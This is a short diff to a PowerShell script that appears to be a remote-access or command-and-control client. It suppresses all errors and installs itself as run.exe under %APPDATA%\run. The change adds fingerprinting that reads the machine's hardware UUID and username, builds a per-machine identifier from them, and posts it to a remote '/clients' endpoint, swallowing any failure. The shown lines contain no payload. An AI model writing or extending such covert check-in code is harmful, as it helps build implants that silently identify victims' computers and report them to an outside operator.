@@ -3,6 +3,9 @@ $ErrorActionPreference = "SilentlyContinue"
 $BASE_URL = ""
 $API_KEY = ""
 
+$uuid = (Get-CimInstance Win32_ComputerSystemProduct).UUID
+$uniqueUser = "$($env:USERNAME)-$($uuid.Split('-')[-1])"
+
 $scriptPath = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
 $installDir = "$env:APPDATA\run"
 $runExe = "$installDir\run.exe"
@@ -74,7 +77,8 @@ $h = @{
     "Prefer"        = "resolution=merge-duplicates"
 }
 try {
-    Invoke-RestMethod -Method Post -Uri "$BASE_URL/clients" -Headers $h -Body "{`"username`": `"$env:USERNAME`"}" | Out-Null
+    $body = @{ username = $uniqueUser } | ConvertTo-Json
+    Invoke-RestMethod -Method Post -Uri "$BASE_URL/clients" -Headers $h -Body $body | Out-Null
 }
 catch {}
 
